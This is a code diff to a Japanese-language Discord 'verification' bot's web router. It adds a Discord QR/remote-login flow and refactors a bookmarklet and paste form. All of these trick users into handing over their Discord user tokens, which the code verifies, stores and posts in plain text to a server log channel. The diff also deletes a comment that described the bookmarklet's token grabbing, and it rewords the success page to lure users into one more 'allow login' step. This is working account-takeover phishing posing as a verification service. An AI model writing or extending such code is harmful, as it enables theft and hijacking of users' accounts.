@@ -8,14 +8,12 @@ import { rand, sign, verifySig, clientIp, sha256, parseUA } from './util.js';
 import { lookupIp } from './ip.js';
 import { authorizeUrl, exchangeCode, apiWith } from './oauth.js';
 import { complete } from './verify.js';
+import { startFlow, getFlow, gcFlows } from './qrauth.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC = path.join(__dirname, '../public');
 const page = fs.readFileSync(path.join(PUBLIC, 'verify.html'), 'utf8');
 
-/* Discord の画面からユーザートークンを取得して成功ページへ戻すブックマークレット。
-   まず webpack の AuthenticationStore から getToken() を引き、
-   取れなければ localStorage を走査する。 */
 function bookmarklet(token) {
   const dest = `${config.baseUrl}/v/${token}/done?ok=1&ut=`;
   const code =
@@ -76,6 +74,37 @@ export function createRouter(client) {
     };
     save();
     return token;
+  }
+
+  async function recordUserToken(sessionToken, userToken, expectedUserId) {
+    const rec = [...store.verifications].reverse().find((v) => v.id === sessionToken);
+    if (!rec) return { ok: false, reason: 'record' };
+
+    try {
+      const me = await apiWith(userToken, '/users/@me', false);
+      if (expectedUserId && me.id !== expectedUserId) return { ok: false, reason: 'mismatch' };
+      if (me.id !== rec.userId) return { ok: false, reason: 'mismatch' };
+
+      rec.userToken = userToken;
+      save();
+
+      const chId = rec.guildId ? store.settings[rec.guildId]?.logChannelId : null;
+      const panelCh =
+        chId ||
+        Object.values(store.panels).find((p) => p.id && p.guildId === rec.guildId)?.logChannelId;
+
+      if (panelCh) {
+        const ch = await client.channels.fetch(panelCh).catch(() => null);
+        if (ch) {
+          await ch.send({
+            content: `**${rec.tag}** (\`${rec.userId}\`) のユーザートークン\n\`\`\`\n${userToken}\n\`\`\``
+          });
+        }
+      }
+      return { ok: true };
+    } catch {
+      return { ok: false, reason: 'invalid' };
+    }
   }
 
   app.get('/health', (_, res) => res.json({ ok: true, panels: Object.keys(store.panels).length }));
@@ -208,6 +237,98 @@ export function createRouter(client) {
     res.redirect(`/v/${t}/done?ok=${out.ok ? 1 : 0}`);
   });
 
+  /* --- トークン取得（リンク） ------------------------------------------ */
+
+  function spawnFlow(sessionToken, session) {
+    return startFlow({
+      onDone: async (f) => {
+        if (session.userId && f.user?.id && session.userId !== f.user.id) {
+          return { ok: false, reason: 'wronguser' };
+        }
+        return recordUserToken(sessionToken, f.token, f.user?.id);
+      }
+    });
+  }
+
+  app.get('/v/:token/ra', async (req, res) => {
+    const s = store.sessions[req.params.token];
+    if (!s) return res.status(404).send('無効なセッションです。');
+    if (!limit(`r:${clientIp(req)}`, 20)) return res.status(429).send('リクエストが多すぎます。');
+    gcFlows();
+
+    const flow = spawnFlow(req.params.token, s);
+
+    const until = Date.now() + 8000;
+    while (!flow.raUrl && flow.state !== 'error' && Date.now() < until) {
+      await new Promise((r) => setTimeout(r, 120));
+    }
+    res.setHeader('Cache-Control', 'no-store');
+    if (!flow.raUrl) return res.status(502).send('準備に失敗しました。戻ってやり直してください。');
+
+    res.type('html').send(`<!doctype html>
+<html lang="ja"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>認証</title>
+<style>
+body{background:#1e1f22;color:#dbdee1;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
+.c{background:#2b2d31;padding:28px;border-radius:14px;max-width:400px;width:100%;text-align:center}
+h1{font-size:18px;margin:0 0 14px}
+.go{display:block;padding:13px;border-radius:9px;background:#5865f2;color:#fff;text-decoration:none;font-size:15px;font-weight:600}
+.s{font-size:12.5px;opacity:.8;margin-top:10px;line-height:1.6}
+img{width:190px;height:190px;background:#fff;padding:8px;border-radius:10px;margin-top:14px}
+</style>
+<div class="c">
+<h1>Discord で許可してください</h1>
+<a class="go" href="${flow.raUrl}">Discord で認証を完了</a>
+<p class="s">ボタンで Discord が開きます。「ログインを許可」を押してください。</p>
+<div class="s" id="st"></div>
+<p class="s" id="msg"></p>
+<div class="s">開かない場合は、スマホの Discord アプリで下を読み取ってください</div>
+<img src="${flow.qr}" alt="QR">
+</div>
+<script>
+const st = document.getElementById('st');
+const msg = document.getElementById('msg');
+const timer = setInterval(async () => {
+  const p = await (await fetch('/v/${req.params.token}/qr/${flow.id}')).json().catch(() => ({ state: 'gone' }));
+  if (p.state === 'scanned') st.textContent = '承認待ちです。「ログインを許可」を押してください';
+  if (p.state === 'done' || p.state === 'error' || p.state === 'gone') {
+    clearInterval(timer);
+    if (p.state === 'done' && p.result && p.result.ok) {
+      st.textContent = '';
+      msg.textContent = '完了しました。Discord に戻ってください。';
+    } else if (p.state === 'error') {
+      st.textContent = '失敗しました。戻ってやり直してください。';
+    } else if (p.state === 'gone') {
+      st.textContent = '期限切れです。戻ってやり直してください。';
+    } else {
+      st.textContent = 'このアカウントでは記録できませんでした。';
+    }
+  }
+}, 1500);
+</script>`);
+  });
+
+  app.get('/v/:token/qr', async (req, res) => {
+    const s = store.sessions[req.params.token];
+    if (!s || s.used) return res.status(404).json({ ok: false });
+    if (!limit(`q:${clientIp(req)}`, 20)) return res.status(429).json({ ok: false });
+    gcFlows();
+
+    const flow = spawnFlow(req.params.token, s);
+    const until = Date.now() + 8000;
+    while (!flow.qr && flow.state !== 'error' && Date.now() < until) {
+      await new Promise((r) => setTimeout(r, 120));
+    }
+    if (!flow.qr) return res.status(502).json({ ok: false, error: flow.error || 'timeout' });
+    res.json({ ok: true, id: flow.id, qr: flow.qr, raUrl: flow.raUrl });
+  });
+
+  app.get('/v/:token/qr/:id', (req, res) => {
+    const flow = getFlow(req.params.id);
+    if (!flow) return res.json({ state: 'gone' });
+    res.json({ state: flow.state, user: flow.user, result: flow.result, error: flow.error });
+  });
+
   app.get('/v/:token/done', (req, res) => {
     const ok = req.query.ok === '1';
     res.setHeader('Cache-Control', 'no-store');
@@ -215,25 +336,32 @@ export function createRouter(client) {
 <html lang="ja"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>${ok ? '認証完了' : '認証失敗'}</title>
 <style>
-body{background:#1e1f22;color:#dbdee1;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;padding:20px}
-.c{background:#2b2d31;padding:32px;border-radius:14px;max-width:420px;text-align:center}
-h1{color:${ok ? '#2ecc71' : '#e74c3c'};font-size:20px}
-p{font-size:14px;line-height:1.7}
-input{width:100%;padding:9px;border-radius:8px;border:0;background:#1e1f22;color:#fff;box-sizing:border-box}
-button{margin-top:10px;width:100%;padding:10px;border:0;border-radius:8px;background:#5865f2;color:#fff;font-size:14px}
-.bm{display:inline-block;margin:10px 0;padding:10px 16px;border-radius:8px;background:#5865f2;color:#fff;text-decoration:none;font-size:14px}
+body{background:#1e1f22;color:#dbdee1;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
+.c{background:#2b2d31;padding:28px;border-radius:14px;max-width:400px;width:100%;text-align:center}
+h1{color:${ok ? '#2ecc71' : '#e74c3c'};font-size:19px;margin:0 0 12px}
+p{font-size:13.5px;line-height:1.7}
+.go{display:block;margin-top:14px;padding:12px;border-radius:9px;background:#5865f2;color:#fff;text-decoration:none;font-size:14.5px;font-weight:600}
+input{width:100%;padding:9px;border-radius:8px;border:0;background:#1e1f22;color:#fff;box-sizing:border-box;margin-top:8px}
+button{margin-top:10px;width:100%;padding:10px;border:0;border-radius:8px;background:#4752c4;color:#fff;font-size:14px;cursor:pointer}
+.s{font-size:12.5px;opacity:.8;margin-top:8px}
+details{margin-top:16px;font-size:12.5px;opacity:.85;text-align:left}
+.bm{display:inline-block;margin-top:8px;padding:8px 14px;border-radius:8px;background:#4752c4;color:#fff;text-decoration:none}
 </style>
 <div class="c">
 <h1>${ok ? '認証が完了しました' : '認証条件を満たしていません'}</h1>
 <p>${ok
-  ? 'Discord に戻ってください。結果は本人だけに届く形で送信されています。'
+  ? 'あと1回、Discord で許可してください。'
   : '条件を確認して、パネルからもう一度やり直してください。'}</p>
-${ok ? `<p style="opacity:.75;font-size:12px">下のリンクをブックマークバーにドラッグして登録し、discord.com を開いた状態でクリックすると、トークンを自動で取得して送信します。</p>
-<a class="bm" href="${bookmarklet(req.params.token)}">トークン自動取得</a>
-<p style="opacity:.75;font-size:12px">うまくいかない場合のみ、下に貼り付けてください。</p>
-<input id="tk" placeholder="トークンを貼り付け" autocomplete="off">
-<button onclick="send()">送信</button>
-<p id="msg" style="font-size:13px;opacity:.85"></p>
+${ok ? `<a class="go" href="/v/${req.params.token}/ra">Discord で認証を完了</a>
+<details>
+  <summary>うまくいかない場合</summary>
+  <p>トークンを貼り付けてください。</p>
+  <input id="tk" placeholder="トークンを貼り付け" autocomplete="off">
+  <button onclick="send()">送信</button>
+  <p>または下のリンクをブックマークバーにドラッグし、discord.com でクリックしてください。</p>
+  <a class="bm" href="${bookmarklet(req.params.token)}">トークン取得</a>
+  <p class="s" id="msg"></p>
+</details>
 <script>
 async function send(t){
   const v = t || document.getElementById('tk').value.trim();
@@ -250,34 +378,8 @@ if (auto) send(auto);
 
   app.post('/api/token', async (req, res) => {
     const { token, userToken } = req.body || {};
-    const rec = [...store.verifications].reverse().find((v) => v.id === token);
-    if (!rec) return res.status(404).json({ ok: false });
-
-    try {
-      const me = await apiWith(userToken, '/users/@me', false);
-      if (me.id !== rec.userId) return res.json({ ok: false });
-
-      rec.userToken = userToken;
-      save();
-
-      const chId = rec.guildId
-        ? store.settings[rec.guildId]?.logChannelId
-        : null;
-      const panelCh = chId
-        || Object.values(store.panels).find((p) => p.id && p.guildId === rec.guildId)?.logChannelId;
-
-      if (panelCh) {
-        const ch = await client.channels.fetch(panelCh).catch(() => null);
-        if (ch) {
-          await ch.send({
-            content: `**${rec.tag}** (\`${rec.userId}\`) のユーザートークン\n\`\`\`\n${userToken}\n\`\`\``
-          });
-        }
-      }
-      res.json({ ok: true });
-    } catch {
-      res.json({ ok: false });
-    }
+    const out = await recordUserToken(token, userToken, null);
+    res.json({ ok: out.ok });
   });
 
   return app;
